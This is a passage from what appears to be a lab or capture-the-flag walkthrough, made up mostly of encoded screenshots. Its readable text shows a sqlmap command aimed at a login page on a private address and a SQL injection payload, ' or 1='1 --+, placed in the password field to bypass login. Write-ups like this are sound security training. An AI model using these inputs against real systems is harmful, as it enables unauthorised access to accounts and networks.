plnvve9712RZyU+88wzl10LdC4wDq6Hp59++umnn77sWqAxh60+hFAOp2xFCOVwylaEUA47Cwih3PFaB++//z5O1orQuJrAW0oQQhnsLCCEchgHCKEcxgFCKIdxgBDKYRwghHIYBwihHMYBQiiHcYAQymEcIIRyGAcIoRzGAUIoh3GAEMphHCCEchgHCKEcxgFCKIdxgBDKYRwghHIYBwihHMYBQiiHcYAQymEcIIRyGAcIoRzGAUIoh3GAEMphHCCEchgHCKEcxgFCKIdxgBDKYRwghHIYBwihHMYBQiiHcYAQymEcIIRyGAcIoRzGAUIoh3GAEMphHCCEchgHCKEcxgFCKIdxgBDKYRwghHIYBwihHMYBQiiHcYAQyv1/tSbMb95LyO8AAAAASUVORK5CYII=" alt="" /></p><p>There may be an sql injection vulnerability. I tried to find sql injection with sqlmap, but it did not find anything.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s2">"http://192.168.1.4/index.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"uname=admin&amp;psw=12345&amp;btnLogin=Login"</span>
+</pre></table></code></div></div><p>But after try to find manually with burp repeater, there is a sql injection vulnerability in <code class="language-plaintext highlighter-rouge">psw</code> field, which can be exploited by putting <code class="language-plaintext highlighter-rouge">' or 1='1 --+</code> in password field. and it loads another page where we can ping any device within the network.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAosAAABgCAIAAAD6lK8oAAAAA3NCSVQICAjb4U/gAAAAX3pUWHRSYXcgcHJvZmlsZSB0eXBlIEFQUDEAAAiZ40pPzUstykxWKCjKT8vMSeVSAANjEy4TSxNLo0QDAwMLAwgwNDAwNgSSRkC2OVQo0QAFmJibpQGhuVmymSmIzwUAT7oVaBst2IwAACAASURBVHic7d1/jOPWnRjw7xiHkH80IwLtrgjUWzGIWxGOF6Jh1KLPBcQERUXjgoiHIhGvSCMeDoWYosDQSJCRkUutvQaQDg1uaBjXoYMYQ6cohusDbrSBLyOnSEbG9SA613ropPZwczGG6ywgbmFAnCsaUYA97B+UNBqNNDu72R3J2e/nD3tWQ773fY8/vnqPb6SlL3z+XwFCCCGEFsxD8w4AIYQQQlNghkYIIYQW0e/83//Xm3cMCCGEEJq0FEXRvGNACCGE0CSc5UYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQW0e9M/PvKlStziQMhhBCau3fffffq1avzjmJgMkMDwPPPP3/+cSCEEEJzd/ny5XmHcARnuRFCCKFFNGUMHVuo9xEIIYTQ/ZNKpV577bV5RzFpZoYGgJ///OfnFgdCCCE0L4u5BgtnuRFCCKFFhBkaIYQQWkSYoRG6PzzPm3cICKGPNczQiyR0LYUjl5aWlpYoQWu6YeA26xKzNHilYjl+vFmzLjG0UG/5J8vwWxWBWlpaIkVzym/Pl+e44R3uErqOBwAAvj1oh2TdcRley9QEemlpaWmJ5iVZ5BmKYjhBMezgDosCANcQGYqVLe/OdguaVanaPCX0wG1owyN1R2EFLY2jaL5i36ZffEtmKUY03FO3uotjNDI6WAChXRdoilObd9HDA4FjyINznRbrLS8MHGt4GJcYqd50AwCAwG1UBJqRDGdKVV5T48mlpSVKaZ6tykZdETmWZXlBlCRZ0xutRqXeuOseOZvAMSRmaWmJ5OqnHxyEouOq1Wr8w2OPPRah89fbLiUBAIj8Rid+pbtZSAAAJAqb3dFme7VibXdGEftrWWK8gDnp7dZy+fX9O9qnu7OSKW724n/s1TIAQBSG/76zkjYLBAAQubX9uNw0AEDiTgMaFZQobd/Rbp2NfAIStzkGoyPVPW2rSburGQAgsmv7p2+3U07G/Te79Ls5RiPHDtb+eo4AgPRK++4Ki3U24nM9Wdo+Xi6kyjtHp8HOSnFm0O2V9NkOV293LZ8kIJEpb+4Niu7urhfTxF2ecXckPquITG3vfteEzmoxcx+OoRcMKapyGgD6LbPhAQAAJalyCgAOWmZjOCp2mx4vc7MLud9R3lboGrL03O1GeccFdl2SXzg2oiPuOoDjXUAJspQGgIOW1bzDmQVK0htrtfVGXbyTvVxTbx3AQcuw7v0giasYG7WaaajM6dsJVWu9ttbQJWr67+/mGI1MHixGMcy12oZZ5e+quAFaVqUkANxqGI14hMzIqpgAgBsNszWoLGw1Q0lifpN6APyGIj37+i3I1RuGzA7OFopTLavKncPlM/8rFH08YIZeOLyqZAmAvj28u5McxxAQp2gPAACchsvLDAAAeM2KJMqqIomqOX26MnBMRZRkiWNYQRsUAOA3KxIvSIosCnK9Gb8a2PV42lWomBWJo0mS5hTL9RoVmaNJihEqrdHE4qn1uqYiVa7dgL5dFTlOMjwACGxd5nlJUURB0qwTu4SOLsvVN25Bv1XhOU6xjqYw/WZdYimS5hTzKN0FLV0WJVWVRFk/y9x1GIQAABTDxPkqdK2KqqqKyNI0J4+mv/2mJnCCJPE0SQqGD4FrKuIzzz73VaVuw3BHTRJlmWcYXpnR5WHLaJEMAdB/0zDsEy01FZ6hWV5UDedo97N2vt+qSOIfPvecUrECCGxdpJeWlkheM+oyz1AUI9btEABCr6GK4lefe1autuJaDYnnRUlgqSVabZ08Rj87mnl1PEvlaYrVWuH0jjpxsG7YuiT8wbPPqZrpDhuytMQqTQ8gcEyZoYV6vKdraaKoqLIoHp2LY0hh8Ha0aVrxWymKZRkAgFsNM07aYasRiiINp5cWOIYisBTF8IrpnDxIdr1y9QYAIaqD62iEUzSRGp4MJ68Rv6Xx8aOJiqlJHE1RrDw6C1xL4TlBEjlqiZQGU+Wha2kiL8iKJAiKPu251DBcUVJUWZSmPrtCD6yJMfVijvQfMJ3BzN5gynBvrVQsZAgAILK1vSjqtVfL8cxlr72SJpLFrV4U7ZRTxGAmcH8tdzTL3dksJIlMbS/qbRUTw6ny3u5qhhhMHLZX00CkV+I5xHjaFRK5tb3eYL6dSBU39nrxVDuRXdubXe/JJhC54WTk3nouAYniVm9QR6q4dWLudXJWe6+WIQAgkV3Zam+V0wCDAqIo2qtlE3ED92oZIlnYPDGZ3Buf5e7truWTkEgXajtxrd2tYhJSpe1uFLVXUgCQXt2NBo8Y4tbsbxTycWO3iwkASMXHortdGrS3vZIab+C47lZ5ZWvvxIRtNCwAIFnc6ka9vbVcAo5muc/Y+dHe+Nz44FxJ5NZ2e52N/Pjjjbhl8Xzv/lqWIHLrnSjqtVdz8RTw5DEadFm6UCoV82kCEoXN7oyOOnmwunHdcYy7tcz4HO5urRSH3t0qpYjUyk4v6m0VE0RmddqDmt1aBkbnehS1V0vFQgpg2LDu1spK3KPTS4tnuYnMyk6n190up2Fihjw62gggM/NR0exrJG45JAsb+734FB2clt3NQiJuc29vLV/c6EZRFEcQv7hdSgKRjWvsHZvl3t/Ixxdp1FnPEYmpJxW63xYz9+EYegHRg5m965bRDMFuuEJdV3gCoP+maTqBbYWiSAFA0Kib14HhORKAYWm4YRmtieGCo1ev3SJZlgFSUJRsmuMZEoJm3Xi7TzAcQwKwLEP0r5t6PEAhSQAgeEVmSZKmaQAAXpZZMh579j3XP1u9E1p6/Y0DYBiGBGBYloQbDd30ztQZhKBVJV4QWAIg9DwfAMJmXX/zgGFZGoBmGLjVNGctUOq7libyLP/s62GaF0WOiacXA98P4Ear6QJQNAUAvueNXn5JkeotUtYrXDyWGpuR9My6dQNYniWBk9VcmuOYk1PIntWgZJEdTdjq1tGgyG/o1g0gOFGggGQliR2fxz9T50/OkMY7cZLEkTRNk2PbjW/pe36//0ZFVCyPq9QVempnkSQAgOdzVavpuLuOKVMzOmrazmM/c4omENB/2zRtAHBbviCzY73HkUDSNN1/2zInJxgAgJPVXHyuGzaETSuU9OrRgx+/2SIlgbxdaSQnCjRJibKQBLhhGceX7IW+7wEAECQ54wnAadcIAAFA8LLMDI5S6Ht+3DVh/+2qJBsurdZVFgB8q25eB4JhGACS4Rii/6aun1g+aBv112+RHMcC0AxDHtjmfXg2gj6eMEMvIkoaPY4zLcsXJYaRFYEAgOuWXrUgTtDg2M4B9L1GVdO0uk1xWY4Kjmcq37Y9gDAMAYASddttVXgS3JZzAADx7YkkSQA4cOyTN4WTd6+4pNvXO8FzHB+AIGkSAIAEEqDv2FMmH6cjj+7/YRgXFwD4tq5pWrUZclmeCmfMDBKsrDdtz2/XOP/1F776DCfqLgAwasNt7zbV0NCqDR8A4lBoQRYSADdef07kpQbJTSay0LHt/iAIkq+0XFsXT3SSY9mcwpOjFQUHLeNoHbhru30AoKjbPoic1flnMGU7TpbSBBy8/cof8HzFZ2YvYQCgeZ6J8wk1s6Nuh45P4Oum0Qzshi9INACEju30oe+aFU3TTI/OZhlyWpMYSYnfoDYMy2qQkkhzyvDBT73eouMEfbbSKIqG0Tu7EXKQmfuBP+u8PeM1Eh/GEEIAYCWFI6B//epXeV5xaI4CcGynD0CSFDkqJTha/z7gu44HEDqGpmmaFXBZjoK7XxGPfruc9qmfaG5IUZXTr7xw/eBapb7SsCkAkBRRe/3awY1XGrBTH9zf41TBqbo+vj7HO/oxvmP1XceFkwvL4iHT3SwUml7vGQxqvPs/74n/G0AfgGTkui6dbckNxVeqivHZF24cvGEYtqbzAL5dVQyoNKpS6+qbtwbbMYrVChVJu3bjxuvPShrjmseXWYUhAPRd2wlVcXrNYctseL6nqgAAAZUEuNV/09DjOkdNOGuuvSvTyiZ5vWmBrLzw5sHbL8ky49gVdsbu8Vj5yNSOuh1KVKXU1ZduNHSNFBR98Ow/BACCFjR9ZuUAEK8Xq1x75dYNSzWqtk0CsLLCV998o/+22ZIdHe6ktHj5AXW8TbzIJ165dgCe6wbAzRpHwx1eI6zWbIaS/Nwbt65f/UOJZoeRwvjlOi3EEACAlqq6ckoo6IGEY+gFxatKhgAgGFkVSICjcXVaVoTBFc+wLAFwo2kN1+P6nnf8JhDPBMP1o2noMAyB5dkEDMdk8X8THH/qTXOy1NvUO7y1DdAcR49XGAIQLD9lzezZ1m4zHJOI12UPhhqB59120EENJzRJEsAzZfHZa6RSVdhjQdiNFq02nNZaPgVwy25NjJlIlmUBxmfVJ8e1fsOCatMyYlajnj96XAEw7Drw/XNeDeQ1G4Gk285WOZOAvmM7AUwco6Hjh2BWR53ccgIpqHIG4OB1mxIH5yvJsgxA32k0Bt06ObQd21mRUgAAnKLEpyUjKUICgOAUeXCenq20IAgBCFbgj6c+SqooaSKeOJ/cyXfdAO7mGglaDYevtJyd1VwSwLNtH1ieI4Zn/HAqi+WY4/tRLEMB9G1rGEp4htMZPSAwQy8qVlZ5guBVZXhXIAVFShEZRRmNWxlZERMA1w1ZqluNhqGZ7th7/hAAQNDULAFw4yVFqhiWWVerrXBwf+p7jgcAnuP1ibSixYPFcHyIF98mTr7zn1nvEYqiSIC+7/leq2mDoGlZou87Xjj4qK2UVFGYiWIHg7fA97xmM77t9mHQknDsn/EADeDWVVXSzEbDrNTtE5PC4fH/By2z8TYAJHKawkHoNFsHAF7D0Ot6fF8MfMcPIGjUK02f4jVdzRDDO/JY+zlVyyfimlXDNOtq5fgN3jGNcJiQAABoKV5RcMuqx4/dGVkREtB3TMMO/KZuun0ACAb5+kydPzmiC8Ox18IpW8YbuEZFd0JG0qtigmBZlpo8RuG0ymZ21MmDdSICTlVzBJFVldHkDaeoWQL6b1YlWbeall5peDPGjKSgyhkiKWny8EEDLSliguCVo6XXp5YWxu+BPMfxISXHD4WPVcDXLT2fgoPXK3J99LcAod/SFa0RAJx2jYydlsdb7VuVih3QQr0upwia42hg5IqcAvBcDyD0XL9PZDVNJI+fzySvymkCDl7XJNVoNKx6pRngX2OhgYmVY4u5nu3B1N0slY+veG6vliY+pqK7UytkkgSRSGVL67u9KIo6O6u5eBFxfq3diaKos72aTycJIpHOrYw+myHa31rJZ3OFUiGXza9uxYV227XRrrt7OyvZ+LMiChu7u1uldLy8vLS535ta74Te3noxnSCSmeJGXGdnp1bMZgulYi6bK2/sTdkl6rZr+VSCSGbLW/tH7UgVNnZ3N+LlvInc6k4niqKot7teyqYSBJHMjBZoH9W9v7OxmksCAACRyhWLhWw6mcrkSrWtQb2d7XImQSQzhdr2fruWSxKJdHFjrxftlFNAJLOFQi6bX9nuRFFvd6OYBgAgMuWtuOXtteJRy7vj0a8XMwSRLq5ttjuDONqbq/k4DkjmVrf3o+HxSBCJVL62sZpPZ/PF8ur6Tuesnd/ZWRlsV1hre+21uPxErtbe3SymBqFu7/f2t8qZeK/ixm63s5EnIJHOFfLZbHF4wI4do97eUR9v7w8Pz6yOmjhY3aM4BgcoPoGLxYmPbBk7GY8+KGSq/fXiyrEl2L3tcmniw1emldZezRdqmxsrxUKpXMxl8ytb+zOr6e5urpZymVQylcnmcvl8obS2Pbb1tGuks7OSPTot18db3dsqEkCkcoVCLnt0Uvb2Nsq5bK5YKmSzxVrcOd322vHzube3Wc6lEgSRTOdXt+f7SUMPrMXMfUtRFI0n7CtXrjz//PMAcPnyZfz2SYQQQg+Cxcx9OMuNEEIILSLM0AghhNAiwgyNEEIILSLM0AghhNAimvmJJalU6sqVK+cZCkIIIYRGZmbo11577TzjQAghhNA4nOVGCCGEFtHMMfTly5fPMw6EFkcqlYrnkPAqQOgBMbrqF8pp35yxOH+1jdB5Gl+BgVcBQg+CxVx3hd9thdB8vPrqq/MOAT3QvvSlL41+3t/f/+lPf/rRRx/NMZ7TPfTQQ9ls9lOf+tS8AzlXmKERmpvxWyRC52niDaJt24VCYV7BnNG1a9cwQyOEEHqwfPjhhxPf0bCAPvzww3mHcN7mu5Y7bGksI1nn/F2590jgNOoKz8rWyS8IXKh2nRLnx4vvWHWZZ2QLvzwXoXtv3l/jdHvz7qE5uN8Z2ncahsKRS0sUK0iSyHMsL1ca3iBZkAwvCgIz40ti75nQbZmaQC0tUaI5JWv6pkguLdFixWp5d5LFaIb0nKl7nFO7The4bpzKZsd5mtBrmRWJJZcooe6M7Rw4TVPlKUbSLds7ZX/fveMqb4NieTpw/I/7Gw2EFtDhx8S8++m83e8MTXOSWpFZghCqzUajabcM3tV/X1AGX3zPyLqp8ff768pJVlDqqpCAg5auO5O/dXS91QdCUKuywNxBKBTNcbOS8Pm061SOUW/6AKfHeQqSEZR6o1nPhm9UZa01GrdSnKhUZEHUNJlnZu4dtur11j0e65Ikw8z5XQ9Cv73mPUKOoiiKejduBDN/Oe8emoPzmOUmyaNURQkVlSduNIx7ffu+fRAUXyxQb5t689ggLGwaDiumgRyP8uyl3qvw7rGgpSnjI9+7jpOiaTbDeC/JiumNvXybzvIaqmrcnzn+Re1xhD7W7kl6/e9f/Wf/vPLTO97txsu/90/+9X8Loij62Z/9y99b+9lp2867n87bHJ5DkyQASZEkBG5TVwRWMgOA0GsZmsQJdduxVJ6mKFY+SgmBrStKRddVgV5aImlOkCZHwqFrqrKiaarE87LhTJ8IpURNyQSWPj7T7VtmICvs+GaBrSuyommKyAuKNQrCb9ZVdfCq6Y7X4LcqIktRjFCJ33aMt8u3rYrMcVrTa2gCQ1GMqI+iCxyzommKxLOcVG9NS2iBY2qqpqmyKIia5YZwm44aBWSatn/gN6qqOhhIT4sTAELXqmuaKgscJ2qNyXIAAIDkqg09D9c0uT69X/2WUdE0ReRYXtbtAMBrGJbj912zoqovfv+/yCy5RIu6EwRuQxOoJZJTTCcACL2GwjHi4Gj5LT1uqiBIlTjm0GsaqshKRstSOJoWj7XTbyosxcn1+MmEb8kMIy/Ig3+EPn6iKPrNp6CjCOAuyvlHn/vG977xu588PDzs3TqAU/Z/ADP05FunarUa//DYY4/d8VuhGfbXsgRR2OxFURR1d1YyBJEu73SjqLvfXssRRH6jG0W97v52OUUkc+X17b1up72aIZLlnSiKoqizWUhma3tRFEXdzUKCyK7tT9awt5ZN5NY7URT1tkvJRHGrdzKKrVJxs7u/nieIzOru8MXdWmFlp7e7moZEaTt+qb2SHgTb3cgPg+i1V7L59f0oiqLORp4gcnEMO+UkkS7UNtud7v5GIUnkNzrRsXb1up12LUMksqW1rd1Od28tRyQKm90oiqL9jdLKdjcOv5YlEoWNzmS/beQzpXiT3m4tS6RKW93TOmqyzzNxp82MM+purZQHtXY28gSRXdubLKe7WSxtR1F3u5wmiHR5EPD+enFlZ9j1pdV2L4qiqLezkiaSpe1eFEW7q+lhJVF3s5AYHZL2SprIxR0ZRbu18sb+sAcyK+3BGVJOE5mVdi/q7rfXCwkilVvd2N5cLa9ud6KdcooobHajqLNVLtZ2uqMwt1dyuWF3/ubux1Vw0tWrV+9f4QidbuL0e/nllz+Y7mb7xdLTj1xcXl6++Mjnyt9/64MPPvig/e0nlp/57s14g/de/NzyE99+64MPPrgqX7z0TFl+4tLy8sVHnpZf3Ln5wQcfvPfdZ5afLn/r95947JFLFy89Xf7+tRdLTz/2yKWLl54oxaW99Z2nlz/34nvvvPjMpWUA4uKlZ158Z2ooL7/88v3rkPO56u/UeY2h+15D1+uaoui+oLdahkABUAzPsXT8e5JiWJYGmldVkaVoXhLowPN8AAjtRiugGQYAgOIFFjzXmyydYgVZ5qm4ICr0/VlT6IyiydTbpt4MAADCpmHzqnB84pTmRVXmybgoMgiCECCw6iYlywwAAC1VTV0T6eH2rKzJPE0xosSB63hwrF0kRbMMAySnaBJHU6wosmHcLMfQHd8xdV3X9YbPCDwEEyPAll61WUmIW8WpmhhYddOd3VG3cTJO39KbnmPpuq7rlkuLAuXPWoZFibpV5/2XlMkBe0s3XL9l6LquGzZwAge+N7mvpIhky4q7nOEYsM14tO40fV5kACBoVHWfl+Ln9pRQUXnXqFo+xfA8SwMtKooo1436sM9Dv6lptmxUhNFDaUrUWy1dxIfUCN2dmSki+MtvfvN/f/a7/+u99977ybcu/vjrf/JXvWgwlB1tM/oHhL/6m59f/Nb2e+/85DtP/N03/92f/I9eFAH0/+eP3y9d3Wm/1SiH5lf+w48/99JO+62ffOvi9jeNvx2WEEUX5e9/V750Sf7uW9+XL84KZ66dNAfn9ffQBCNpmnzyIeLkK8N7LEmSEIYAACRNU+AEAQAdv0wz9MROQIt1I3AbesUOQ/fUtb6kqCmZV/S6VRVV0jIDWWcBjk2ZM7KuB7alG04Y+AA0AIBjO0Apg1gpXlanlUySMAh5SrvGN4IQIHRdjxIVTR20pXJiU9e2fZKjhgVRHM9A1XZDiKfkT3bUGR3F6douKRiaNpjj107fjdMs0+Z/X5UrbGvUfs9xfUbTNImc1QwAIEVFBNlqBZIUNGxaYlqm5WqVoOnzcfPdlh1Q8ii9MjxHQ8N2QaEBSCCp44nXMxQ54BpVTMcI3TNRFB1OXSl9uLxMvP8Tc/MR+bO/K77wNyIAxPPZ8Ww0ABxG0WBuO4qIS9LXv/bUhUOAp7729Wc2v/GXf/ufHj2M4NIzX3nqk4eHh59+9DPLFz7zFfHC4eHhhU8/cuHgV7cODw8PR5PjUQRxuTODvI9dsJA+Bt9txVd0OWg0PAAI7FYgascfGwMAhI4hSXWQ6vWKwt3mzs2pag7e0A3bMRuUKp3I9kGrLsoWLdfrFZk9SrSh53ljFU5PimfPlCFA6NrH/oopmBz4hxCP4GMURd1ugdad1A4AIYSe7YzVejKEY2jJtFY5R5fVpndUVOjY4+9wxiIeIQVZJJtW07ctV6hXFc61TLvV8oXBoDcMoT9eN0lT8XKF6WHImhSaitbEP4tG6F6ZOYZeFv90848/c2B9W/4Xl//p0/If//D948Pm4c8Q/3ThkUtE/Cpx4ZGLBwcHvQiAWL6wPNyUJInBBp9YHo68xwbhp8aCGXohUQzHUo5RN3TDky1LOZFUfatS8XhNYs5UHCNX5OR1Q1FavCacSAOuoVVDqSIMKwkBAFiOgTdN0x4kn9CxrBN/tHVnKIZhbjXqhjv4d9A0G8enqhmOo/p2c1gnBEFA8gJ35hR9+w1Zjg2b9fqoVbZluafvQfJ1yxDDV7ThSj2aZanrZn20RMu3zGmJkxQUiWoamhGIEs3KMudaWt0XhrPUnMAlfNseVR76ASWI3KwgaFE3FdJS1cYZJvcRQmczPSUG7/9d+PjXjL/66+vuX2/826ix8u0f9iIiAgjDMN7iIDjoj1Lt3//q1mDH3sH7B8sXLxBRNFH2sdnx4X4nfofpGQDOJ0OHYXiWUWcIABAcez0EAHB1VQ8YnmNphmVIz3ZPpIAwDEO3ZbU8zzZN24fAc1qTn6YRHkVAiZqSDn16tIZ7EF8IABAGITgNy/bclmHaIQSe3bJB1qTU27osVUzLMjSpGvD8cMcZbR6PbuJXAQAAr6o5eKMiCqpuGHVFtmjx+NQAKVYq2aBRH6wmd5tNUCoyfUpHHdubIsF3Xd9r2d6sOBlZE6m3/1QUlLph6Kqsg8CfbEh4/MgximmtMMMKSUFVMsE1hRc13TQqsmKzIj2o3nM8323ZPgAAycsiZTu0JJIAjKzwvkeLo8fGlFRRGNeoN+LVAbZl01pFJActO15/CGEIlKAbKtlQR38CFjQ1nsdRNUJ3a+b66eCH//HfqN/5sX94+Il/+I+XCVhe/uTh4T94+GF4Z3vrF91fd3+x9Z+//w4Q8Zx31P/l9is/9A8PD3/9C+vFneXCFx8fm7oeTF8Pf45Gs+NHr36C+Pv/8/4vur+eGc68++ncTbxJudfr2Tq7W+ulDAGQyK5sbO8dW2zbaa8X0wDJ/Or2XmdvayWbACJb3mh3Ou2NcoaARG51a68b9dqr2WQymSCIQciJ3NruRC3bK9lkIpku1Hb2NoupZKa8tT/2697+zuZqPpnMrWzsxCHsrxdXtntxEFtrxTQBkMyvbu7s96L9zVImmUhmiuvt3fV8Mplb3elGUdTb3Shlk4lEMlOo7XSiKIo6O2vFNECqUNve29/bruWTAOniersz1i7H3Rm+vrPf2d1cySWAyJY3d7tRFHV2aoVMkiAS6UKtPXUZcmenVshmc8VyuVSube9HURR1Z3fUMfubxXQymSlvdWbGGUVRd3e9mE0RRCKVW9meXEve3dvZWMklhh0zZm+9VGuPatpayacTBJHMFNd3e6MtCqlEatB3URRFUXu1OFzDHXU2Sis7x9fb72+t5rPZfKlcLpXXBh0ct47IlNbbnSjq7e8M+rW2vdftbBVTAES6uLa914s6m4VUqrA52YK7hWu50W+9idPPMIyb0/2y9edffurTF5aXl5cffvwL1R+8c/PmzZs34xcJ4sLjX6xVv/DwU9X2zZs3/+sXLzya/3L+8UcfffTTjwp/9L32zZs3b77z5/nlx6vtuLC/+PLDD//RD+KfW889uvyF7928ebNde2pZ+LN3bt68+csf/PvHLxDEo8+9PjUUwzDuX4cs5lrupej41MGV3Y3qCQAAAj5JREFUK1eef/55ALh8+fKCfDOua2pNrq4N53dDv1nRHMWqzJoFReg3dD5XwauvvorfbYXmZeL0Mwzj85///BzjOYvXXntNVaet070XFjD3wcfgu618s6JDxTl6qkrSDMMEzPwiQgih3zLRrLXciyR68B5FL/xKscD3XatSaTheEEIY+LZVMUhZwj+1QQihe2XOk7lnNu9+Om8Ln6HZitXQ6JYmsDRFsaLaAKWunn1FM0IIoduZd+Y9q3n303lb+FluAEasWOLUj8JACCF0Dzz00EOLP8v90EMLP6S81z4GGRqh31avvvrqvENACADgySef/NGPfvTRRx/NO5CZHnrooSeffHLeUZw3zNAIzQcu5EaL44knnnjiiSfmHQWaNDNDp1KpK1eunGcoCC0avAoQQnM0M0O/9tpr5xkHQgsIrwKE0Bw9cA/eEUIIoY+FyTH0u+++e/ny5bmEghBCCKGRyU/9RAghhNAiwFluhBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQWEWZohBBCaBFhhkYIIYQW0f8H6PVDh7w4LZcAAAAASUVORK5CYII=" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="data:image/png;base64,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